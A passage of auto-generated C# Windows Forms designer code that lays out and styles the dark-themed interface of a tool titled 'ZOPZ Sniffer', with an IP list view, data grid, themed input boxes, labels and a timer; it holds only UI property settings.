            this.textBox7.Dock = System.Windows.Forms.DockStyle.Fill;
            this.textBox7.ForeColor = System.Drawing.Color.White;
            this.textBox7.Location = new System.Drawing.Point(0, 0);
            this.textBox7.Margin = new System.Windows.Forms.Padding(2);
            this.textBox7.Multiline = true;
            this.textBox7.Name = "textBox7";
            this.textBox7.ReadOnly = true;
            this.textBox7.ScrollBars = System.Windows.Forms.ScrollBars.Vertical;
            this.textBox7.Size = new System.Drawing.Size(818, 308);
            this.textBox7.TabIndex = 15;
            // 
            // listView1
            // 
            this.listView1.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(28)))), ((int)(((byte)(28)))), ((int)(((byte)(28)))));
            this.listView1.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
            this.Ani.SetDecoration(this.listView1, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition1.SetDecoration(this.listView1, Guna.UI2.AnimatorNS.DecorationType.None);
            this.listView1.Dock = System.Windows.Forms.DockStyle.Fill;
            this.listView1.ForeColor = System.Drawing.Color.White;
            this.listView1.FullRowSelect = true;
            this.listView1.GridLines = true;
            this.listView1.HideSelection = false;
            this.listView1.Location = new System.Drawing.Point(0, 0);
            this.listView1.Name = "listView1";
            this.listView1.Size = new System.Drawing.Size(818, 308);
            this.listView1.TabIndex = 0;
            this.listView1.UseCompatibleStateImageBehavior = false;
            this.listView1.View = System.Windows.Forms.View.Details;
            // 
            // Label
            // 
            this.Label.DisplayIndex = 0;
            this.Label.Text = "Label";
            this.Label.Width = 390;
            // 
            // IPC
            // 
            this.IPC.DisplayIndex = 1;
            this.IPC.Text = "IP";
            this.IPC.Width = 390;
            // 
            // dataGridView2
            // 
            this.dataGridView2.AllowUserToAddRows = false;
            this.dataGridView2.AllowUserToDeleteRows = false;
            this.dataGridView2.AllowUserToResizeRows = false;
            this.dataGridView2.BackgroundColor = System.Drawing.Color.FromArgb(((int)(((byte)(28)))), ((int)(((byte)(28)))), ((int)(((byte)(28)))));
            this.dataGridView2.ColumnHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.Single;
            dataGridViewCellStyle29.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
            dataGridViewCellStyle29.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(28)))), ((int)(((byte)(28)))), ((int)(((byte)(28)))));
            dataGridViewCellStyle29.Font = new System.Drawing.Font("Segoe UI", 10F);
            dataGridViewCellStyle29.ForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle29.SelectionBackColor = System.Drawing.SystemColors.Highlight;
            dataGridViewCellStyle29.SelectionForeColor = System.Drawing.SystemColors.HighlightText;
            dataGridViewCellStyle29.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
            this.dataGridView2.ColumnHeadersDefaultCellStyle = dataGridViewCellStyle29;
            this.dataGridView2.ColumnHeadersHeightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.AutoSize;
            this.Ani.SetDecoration(this.dataGridView2, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition1.SetDecoration(this.dataGridView2, Guna.UI2.AnimatorNS.DecorationType.None);
            dataGridViewCellStyle30.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
            dataGridViewCellStyle30.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(28)))), ((int)(((byte)(28)))), ((int)(((byte)(28)))));
            dataGridViewCellStyle30.Font = new System.Drawing.Font("Segoe UI", 10F);
            dataGridViewCellStyle30.ForeColor = System.Drawing.SystemColors.ControlText;
            dataGridViewCellStyle30.SelectionBackColor = System.Drawing.SystemColors.Highlight;
            dataGridViewCellStyle30.SelectionForeColor = System.Drawing.SystemColors.HighlightText;
            dataGridViewCellStyle30.WrapMode = System.Windows.Forms.DataGridViewTriState.False;
            this.dataGridView2.DefaultCellStyle = dataGridViewCellStyle30;
            this.dataGridView2.Dock = System.Windows.Forms.DockStyle.Fill;
            this.dataGridView2.EditMode = System.Windows.Forms.DataGridViewEditMode.EditProgrammatically;
            this.dataGridView2.EnableHeadersVisualStyles = false;
            this.dataGridView2.Location = new System.Drawing.Point(0, 0);
            this.dataGridView2.Name = "dataGridView2";
            this.dataGridView2.ReadOnly = true;
            this.dataGridView2.RowHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.Single;
            dataGridViewCellStyle31.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
            dataGridViewCellStyle31.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(28)))), ((int)(((byte)(28)))), ((int)(((byte)(28)))));
            dataGridViewCellStyle31.Font = new System.Drawing.Font("Segoe UI", 10F);
            dataGridViewCellStyle31.ForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle31.SelectionBackColor = System.Drawing.SystemColors.Highlight;
            dataGridViewCellStyle31.SelectionForeColor = System.Drawing.SystemColors.HighlightText;
            dataGridViewCellStyle31.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
            this.dataGridView2.RowHeadersDefaultCellStyle = dataGridViewCellStyle31;
            this.dataGridView2.RowHeadersVisible = false;
            this.dataGridView2.RowHeadersWidth = 51;
            this.dataGridView2.SelectionMode = System.Windows.Forms.DataGridViewSelectionMode.FullRowSelect;
            this.dataGridView2.ShowEditingIcon = false;
            this.dataGridView2.ShowRowErrors = false;
            this.dataGridView2.Size = new System.Drawing.Size(818, 308);
            this.dataGridView2.TabIndex = 1;
            // 
            // logInButton2
            // 
            this.logInButton2.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right)));
            this.logInButton2.BackColor = System.Drawing.Color.Transparent;
            this.logInButton2.BaseColour = System.Drawing.Color.FromArgb(((int)(((byte)(42)))), ((int)(((byte)(42)))), ((int)(((byte)(42)))));
            this.logInButton2.BorderColour = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(25)))), ((int)(((byte)(25)))));
            this.guna2Transition1.SetDecoration(this.logInButton2, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Ani.SetDecoration(this.logInButton2, Guna.UI2.AnimatorNS.DecorationType.None);
            this.logInButton2.FontColour = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))));
            this.logInButton2.HoverColour = System.Drawing.Color.FromArgb(((int)(((byte)(52)))), ((int)(((byte)(52)))), ((int)(((byte)(52)))));
            this.logInButton2.Location = new System.Drawing.Point(741, 280);
            this.logInButton2.Name = "logInButton2";
            this.logInButton2.PressedColour = System.Drawing.Color.FromArgb(((int)(((byte)(47)))), ((int)(((byte)(47)))), ((int)(((byte)(47)))));
            this.logInButton2.ProgressColour = System.Drawing.Color.FromArgb(((int)(((byte)(0)))), ((int)(((byte)(191)))), ((int)(((byte)(255)))));
            this.logInButton2.Size = new System.Drawing.Size(75, 27);
            this.logInButton2.TabIndex = 2;
            this.logInButton2.Click += new System.EventHandler(this.logInButton2_Click);
            // 
            // panel1
            // 
            this.panel1.Anchor = ((System.Windows.Forms.AnchorStyles)((((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom) 
            | System.Windows.Forms.AnchorStyles.Left) 
            | System.Windows.Forms.AnchorStyles.Right)));
            this.panel1.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
            this.Ani.SetDecoration(this.panel1, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition1.SetDecoration(this.panel1, Guna.UI2.AnimatorNS.DecorationType.None);
            this.panel1.Location = new System.Drawing.Point(-1, 28);
            this.panel1.Name = "panel1";
            this.panel1.Size = new System.Drawing.Size(820, 228);
            this.panel1.TabIndex = 4;
            // 
            // logInGroupBox1
            // 
            this.logInGroupBox1.BorderColour = System.Drawing.Color.FromArgb(((int)(((byte)(35)))), ((int)(((byte)(35)))), ((int)(((byte)(35)))));
            this.Ani.SetDecoration(this.logInGroupBox1, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition1.SetDecoration(this.logInGroupBox1, Guna.UI2.AnimatorNS.DecorationType.None);
            this.logInGroupBox1.Dock = System.Windows.Forms.DockStyle.Top;
            this.logInGroupBox1.Font = new System.Drawing.Font("Segoe UI", 10F, System.Drawing.FontStyle.Bold);
            this.logInGroupBox1.HeaderColour = System.Drawing.Color.FromArgb(((int)(((byte)(42)))), ((int)(((byte)(42)))), ((int)(((byte)(42)))));
            this.logInGroupBox1.Location = new System.Drawing.Point(0, 0);
            this.logInGroupBox1.MainColour = System.Drawing.Color.FromArgb(((int)(((byte)(47)))), ((int)(((byte)(47)))), ((int)(((byte)(47)))));
            this.logInGroupBox1.Name = "logInGroupBox1";
            this.logInGroupBox1.Size = new System.Drawing.Size(818, 98);
            this.logInGroupBox1.TabIndex = 0;
            this.logInGroupBox1.TextColour = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))));
            this.logInGroupBox1.Visible = false;
            // 
            // logInLabel3
            // 
            this.logInLabel3.AutoSize = true;
            this.logInLabel3.BackColor = System.Drawing.Color.Transparent;
            this.Ani.SetDecoration(this.logInLabel3, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition1.SetDecoration(this.logInLabel3, Guna.UI2.AnimatorNS.DecorationType.None);
            this.logInLabel3.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.logInLabel3.FontColour = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))));
            this.logInLabel3.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))));
            this.logInLabel3.Location = new System.Drawing.Point(3, 70);
            this.logInLabel3.Name = "logInLabel3";
            this.logInLabel3.Size = new System.Drawing.Size(71, 15);
            this.logInLabel3.TabIndex = 7;
            // 
            // logInNormalTextBox1
            // 
            this.logInNormalTextBox1.BackColor = System.Drawing.Color.Transparent;
            this.logInNormalTextBox1.BackgroundColour = System.Drawing.Color.FromArgb(((int)(((byte)(42)))), ((int)(((byte)(42)))), ((int)(((byte)(42)))));
            this.logInNormalTextBox1.BorderColour = System.Drawing.Color.FromArgb(((int)(((byte)(35)))), ((int)(((byte)(35)))), ((int)(((byte)(35)))));
            this.Ani.SetDecoration(this.logInNormalTextBox1, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition1.SetDecoration(this.logInNormalTextBox1, Guna.UI2.AnimatorNS.DecorationType.None);
            this.logInNormalTextBox1.Location = new System.Drawing.Point(72, 63);
            this.logInNormalTextBox1.MaxLength = 32767;
            this.logInNormalTextBox1.Multiline = false;
            this.logInNormalTextBox1.Name = "logInNormalTextBox1";
            this.logInNormalTextBox1.ReadOnly = false;
            this.logInNormalTextBox1.Size = new System.Drawing.Size(202, 34);
            this.logInNormalTextBox1.Style = LoginTheme.LogInNormalTextBox.Styles.NotRounded;
            this.logInNormalTextBox1.TabIndex = 0;
            this.logInNormalTextBox1.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
            this.logInNormalTextBox1.TextColour = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))));
            this.logInNormalTextBox1.UseSystemPasswordChar = false;
            // 
            // logInLabel4
            // 
            this.logInLabel4.AutoSize = true;
            this.logInLabel4.BackColor = System.Drawing.Color.Transparent;
            this.Ani.SetDecoration(this.logInLabel4, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition1.SetDecoration(this.logInLabel4, Guna.UI2.AnimatorNS.DecorationType.None);
            this.logInLabel4.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.logInLabel4.FontColour = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))));
            this.logInLabel4.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))));
            this.logInLabel4.Location = new System.Drawing.Point(3, 39);
            this.logInLabel4.Name = "logInLabel4";
            this.logInLabel4.Size = new System.Drawing.Size(59, 15);
            this.logInLabel4.TabIndex = 9;
            // 
            // logInNormalTextBox2
            // 
            this.logInNormalTextBox2.BackColor = System.Drawing.Color.Transparent;
            this.logInNormalTextBox2.BackgroundColour = System.Drawing.Color.FromArgb(((int)(((byte)(42)))), ((int)(((byte)(42)))), ((int)(((byte)(42)))));
            this.logInNormalTextBox2.BorderColour = System.Drawing.Color.FromArgb(((int)(((byte)(35)))), ((int)(((byte)(35)))), ((int)(((byte)(35)))));
            this.Ani.SetDecoration(this.logInNormalTextBox2, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition1.SetDecoration(this.logInNormalTextBox2, Guna.UI2.AnimatorNS.DecorationType.None);
            this.logInNormalTextBox2.Location = new System.Drawing.Point(62, 32);
            this.logInNormalTextBox2.MaxLength = 32767;
            this.logInNormalTextBox2.Multiline = false;
            this.logInNormalTextBox2.Name = "logInNormalTextBox2";
            this.logInNormalTextBox2.ReadOnly = false;
            this.logInNormalTextBox2.Size = new System.Drawing.Size(212, 34);
            this.logInNormalTextBox2.Style = LoginTheme.LogInNormalTextBox.Styles.NotRounded;
            this.logInNormalTextBox2.TabIndex = 8;
            this.logInNormalTextBox2.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
            this.logInNormalTextBox2.TextColour = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))));
            this.logInNormalTextBox2.UseSystemPasswordChar = false;
            // 
            // logInLabel5
            // 
            this.logInLabel5.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
            this.logInLabel5.AutoSize = true;
            this.logInLabel5.BackColor = System.Drawing.Color.Transparent;
            this.Ani.SetDecoration(this.logInLabel5, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition1.SetDecoration(this.logInLabel5, Guna.UI2.AnimatorNS.DecorationType.None);
            this.logInLabel5.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.logInLabel5.FontColour = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))));
            this.logInLabel5.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))));
            this.logInLabel5.Location = new System.Drawing.Point(494, 70);
            this.logInLabel5.Name = "logInLabel5";
            this.logInLabel5.Size = new System.Drawing.Size(95, 15);
            this.logInLabel5.TabIndex = 11;
            // 
            // asdasd
            // 
            this.asdasd.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
            this.asdasd.BackColor = System.Drawing.Color.Transparent;
            this.asdasd.BackgroundColour = System.Drawing.Color.FromArgb(((int)(((byte)(42)))), ((int)(((byte)(42)))), ((int)(((byte)(42)))));
            this.asdasd.BorderColour = System.Drawing.Color.FromArgb(((int)(((byte)(35)))), ((int)(((byte)(35)))), ((int)(((byte)(35)))));
            this.Ani.SetDecoration(this.asdasd, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition1.SetDecoration(this.asdasd, Guna.UI2.AnimatorNS.DecorationType.None);
            this.asdasd.Location = new System.Drawing.Point(588, 63);
            this.asdasd.MaxLength = 32767;
            this.asdasd.Multiline = false;
            this.asdasd.Name = "asdasd";
            this.asdasd.ReadOnly = false;
            this.asdasd.Size = new System.Drawing.Size(227, 34);
            this.asdasd.Style = LoginTheme.LogInNormalTextBox.Styles.NotRounded;
            this.asdasd.TabIndex = 10;
            this.asdasd.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
            this.asdasd.TextColour = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))));
            this.asdasd.UseSystemPasswordChar = false;
            // 
            // logInLabel6
            // 
            this.logInLabel6.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
            this.logInLabel6.AutoSize = true;
            this.logInLabel6.BackColor = System.Drawing.Color.Transparent;
            this.Ani.SetDecoration(this.logInLabel6, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition1.SetDecoration(this.logInLabel6, Guna.UI2.AnimatorNS.DecorationType.None);
            this.logInLabel6.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.logInLabel6.FontColour = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))));
            this.logInLabel6.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))));
            this.logInLabel6.Location = new System.Drawing.Point(494, 39);
            this.logInLabel6.Name = "logInLabel6";
            this.logInLabel6.Size = new System.Drawing.Size(83, 15);
            this.logInLabel6.TabIndex = 13;
            // 
            // logInNormalTextBox4
            // 
            this.logInNormalTextBox4.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
            this.logInNormalTextBox4.BackColor = System.Drawing.Color.Transparent;
            this.logInNormalTextBox4.BackgroundColour = System.Drawing.Color.FromArgb(((int)(((byte)(42)))), ((int)(((byte)(42)))), ((int)(((byte)(42)))));
            this.logInNormalTextBox4.BorderColour = System.Drawing.Color.FromArgb(((int)(((byte)(35)))), ((int)(((byte)(35)))), ((int)(((byte)(35)))));
            this.Ani.SetDecoration(this.logInNormalTextBox4, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition1.SetDecoration(this.logInNormalTextBox4, Guna.UI2.AnimatorNS.DecorationType.None);
            this.logInNormalTextBox4.Location = new System.Drawing.Point(576, 32);
            this.logInNormalTextBox4.MaxLength = 32767;
            this.logInNormalTextBox4.Multiline = false;
            this.logInNormalTextBox4.Name = "logInNormalTextBox4";
            this.logInNormalTextBox4.ReadOnly = false;
            this.logInNormalTextBox4.Size = new System.Drawing.Size(239, 34);
            this.logInNormalTextBox4.Style = LoginTheme.LogInNormalTextBox.Styles.NotRounded;
            this.logInNormalTextBox4.TabIndex = 12;
            this.logInNormalTextBox4.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
            this.logInNormalTextBox4.TextColour = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))));
            this.logInNormalTextBox4.UseSystemPasswordChar = false;
            // 
            // logInGroupBox2
            // 
            this.logInGroupBox2.BorderColour = System.Drawing.Color.FromArgb(((int)(((byte)(35)))), ((int)(((byte)(35)))), ((int)(((byte)(35)))));
            this.Ani.SetDecoration(this.logInGroupBox2, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition1.SetDecoration(this.logInGroupBox2, Guna.UI2.AnimatorNS.DecorationType.None);
            this.logInGroupBox2.Dock = System.Windows.Forms.DockStyle.Top;
            this.logInGroupBox2.Font = new System.Drawing.Font("Segoe UI", 10F, System.Drawing.FontStyle.Bold);
            this.logInGroupBox2.HeaderColour = System.Drawing.Color.FromArgb(((int)(((byte)(42)))), ((int)(((byte)(42)))), ((int)(((byte)(42)))));
            this.logInGroupBox2.Location = new System.Drawing.Point(0, 98);
            this.logInGroupBox2.MainColour = System.Drawing.Color.FromArgb(((int)(((byte)(47)))), ((int)(((byte)(47)))), ((int)(((byte)(47)))));
            this.logInGroupBox2.Name = "logInGroupBox2";
            this.logInGroupBox2.Size = new System.Drawing.Size(818, 63);
            this.logInGroupBox2.TabIndex = 1;
            this.logInGroupBox2.TextColour = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))));
            this.logInGroupBox2.Visible = false;
            // 
            // logInLabel1
            // 
            this.logInLabel1.AutoSize = true;
            this.logInLabel1.BackColor = System.Drawing.Color.Transparent;
            this.Ani.SetDecoration(this.logInLabel1, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition1.SetDecoration(this.logInLabel1, Guna.UI2.AnimatorNS.DecorationType.None);
            this.logInLabel1.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.logInLabel1.FontColour = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))));
            this.logInLabel1.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))));
            this.logInLabel1.Location = new System.Drawing.Point(36, 36);
            this.logInLabel1.Name = "logInLabel1";
            this.logInLabel1.Size = new System.Drawing.Size(38, 15);
            this.logInLabel1.TabIndex = 1;
            // 
            // logInComboBox2
            // 
            this.logInComboBox2.ArrowColour = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(30)))), ((int)(((byte)(30)))));
            this.logInComboBox2.BackColor = System.Drawing.Color.Transparent;
            this.logInComboBox2.BaseColour = System.Drawing.Color.FromArgb(((int)(((byte)(42)))), ((int)(((byte)(42)))), ((int)(((byte)(42)))));
            this.logInComboBox2.BorderColour = System.Drawing.Color.FromArgb(((int)(((byte)(35)))), ((int)(((byte)(35)))), ((int)(((byte)(35)))));
            this.Ani.SetDecoration(this.logInComboBox2, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition1.SetDecoration(this.logInComboBox2, Guna.UI2.AnimatorNS.DecorationType.None);
            this.logInComboBox2.DrawMode = System.Windows.Forms.DrawMode.OwnerDrawFixed;
            this.logInComboBox2.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
            this.logInComboBox2.Font = new System.Drawing.Font("Segoe UI", 10F);
            this.logInComboBox2.FontColour = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))));
            this.logInComboBox2.FormattingEnabled = true;
            this.logInComboBox2.LineColour = System.Drawing.Color.FromArgb(((int)(((byte)(23)))), ((int)(((byte)(119)))), ((int)(((byte)(151)))));
            this.logInComboBox2.Location = new System.Drawing.Point(72, 32);
            this.logInComboBox2.Name = "logInComboBox2";
            this.logInComboBox2.Size = new System.Drawing.Size(190, 31);
            this.logInComboBox2.SqaureColour = System.Drawing.Color.FromArgb(((int)(((byte)(47)))), ((int)(((byte)(47)))), ((int)(((byte)(47)))));
            this.logInComboBox2.SqaureHoverColour = System.Drawing.Color.FromArgb(((int)(((byte)(52)))), ((int)(((byte)(52)))), ((int)(((byte)(52)))));
            this.logInComboBox2.StartIndex = 0;
            this.logInComboBox2.TabIndex = 0;
            // 
            // logInLabel2
            // 
            this.logInLabel2.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
            this.logInLabel2.AutoSize = true;
            this.logInLabel2.BackColor = System.Drawing.Color.Transparent;
            this.Ani.SetDecoration(this.logInLabel2, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition1.SetDecoration(this.logInLabel2, Guna.UI2.AnimatorNS.DecorationType.None);
            this.logInLabel2.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.logInLabel2.FontColour = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))));
            this.logInLabel2.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))));
            this.logInLabel2.Location = new System.Drawing.Point(566, 36);
            this.logInLabel2.Name = "logInLabel2";
            this.logInLabel2.Size = new System.Drawing.Size(22, 15);
            this.logInLabel2.TabIndex = 3;
            // 
            // logInComboBox3
            // 
            this.logInComboBox3.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
            this.logInComboBox3.ArrowColour = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(30)))), ((int)(((byte)(30)))));
            this.logInComboBox3.BackColor = System.Drawing.Color.Transparent;
            this.logInComboBox3.BaseColour = System.Drawing.Color.FromArgb(((int)(((byte)(42)))), ((int)(((byte)(42)))), ((int)(((byte)(42)))));
            this.logInComboBox3.BorderColour = System.Drawing.Color.FromArgb(((int)(((byte)(35)))), ((int)(((byte)(35)))), ((int)(((byte)(35)))));
            this.Ani.SetDecoration(this.logInComboBox3, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition1.SetDecoration(this.logInComboBox3, Guna.UI2.AnimatorNS.DecorationType.None);
            this.logInComboBox3.DrawMode = System.Windows.Forms.DrawMode.OwnerDrawFixed;
            this.logInComboBox3.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
            this.logInComboBox3.Font = new System.Drawing.Font("Segoe UI", 10F);
            this.logInComboBox3.FontColour = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))));
            this.logInComboBox3.FormattingEnabled = true;
            this.logInComboBox3.LineColour = System.Drawing.Color.FromArgb(((int)(((byte)(23)))), ((int)(((byte)(119)))), ((int)(((byte)(151)))));
            this.logInComboBox3.Location = new System.Drawing.Point(588, 32);
            this.logInComboBox3.Name = "logInComboBox3";
            this.logInComboBox3.Size = new System.Drawing.Size(190, 31);
            this.logInComboBox3.SqaureColour = System.Drawing.Color.FromArgb(((int)(((byte)(47)))), ((int)(((byte)(47)))), ((int)(((byte)(47)))));
            this.logInComboBox3.SqaureHoverColour = System.Drawing.Color.FromArgb(((int)(((byte)(52)))), ((int)(((byte)(52)))), ((int)(((byte)(52)))));
            this.logInComboBox3.StartIndex = 0;
            this.logInComboBox3.TabIndex = 2;
            // 
            // logInLabel8
            // 
            this.logInLabel8.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left)));
            this.logInLabel8.AutoSize = true;
            this.logInLabel8.BackColor = System.Drawing.Color.Transparent;
            this.Ani.SetDecoration(this.logInLabel8, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition1.SetDecoration(this.logInLabel8, Guna.UI2.AnimatorNS.DecorationType.None);
            this.logInLabel8.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.logInLabel8.FontColour = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))));
            this.logInLabel8.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))));
            this.logInLabel8.Location = new System.Drawing.Point(0, 275);
            this.logInLabel8.Name = "logInLabel8";
            this.logInLabel8.Size = new System.Drawing.Size(0, 15);
            this.logInLabel8.TabIndex = 5;
            // 
            // logInLabel9
            // 
            this.logInLabel9.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left)));
            this.logInLabel9.AutoSize = true;
            this.logInLabel9.BackColor = System.Drawing.Color.Transparent;
            this.Ani.SetDecoration(this.logInLabel9, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition1.SetDecoration(this.logInLabel9, Guna.UI2.AnimatorNS.DecorationType.None);
            this.logInLabel9.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.logInLabel9.FontColour = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))));
            this.logInLabel9.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))));
            this.logInLabel9.Location = new System.Drawing.Point(0, 293);
            this.logInLabel9.Name = "logInLabel9";
            this.logInLabel9.Size = new System.Drawing.Size(0, 15);
            this.logInLabel9.TabIndex = 6;
            // 
            // label1
            // 
            this.label1.BackColor = System.Drawing.Color.Black;
            this.guna2Transition1.SetDecoration(this.label1, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Ani.SetDecoration(this.label1, Guna.UI2.AnimatorNS.DecorationType.None);
            this.label1.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label1.ForeColor = System.Drawing.Color.White;
            this.label1.Location = new System.Drawing.Point(4, 5);
            this.label1.Name = "label1";
            this.label1.Size = new System.Drawing.Size(996, 28);
            this.label1.TabIndex = 104;
            this.label1.Text = "ZOPZ Sniffer";
            // 
            // timer1
            // 
            this.timer1.Enabled = true;
            this.timer1.Interval = 30000;
            this.timer1.Tick += new System.EventHandler(this.timer1_Tick);
            // 
            // label2
            // 
            this.label2.BackColor = System.Drawing.Color.Black;
            this.guna2Transition1.SetDecoration(this.label2, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Ani.SetDecoration(this.label2, Guna.UI2.AnimatorNS.DecorationType.None);
            this.label2.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label2.ForeColor = System.Drawing.Color.White;
            this.label2.Location = new System.Drawing.Point(4, 512);
            this.label2.Name = "label2";
            this.label2.Size = new System.Drawing.Size(172, 15);
            this.label2.TabIndex = 104;
            this.label2.Text = "Staus: Idle";
            this.label2.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
            // 
            // imageList1
            // 
            this.imageList1.ColorDepth = System.Windows.Forms.ColorDepth.Depth8Bit;
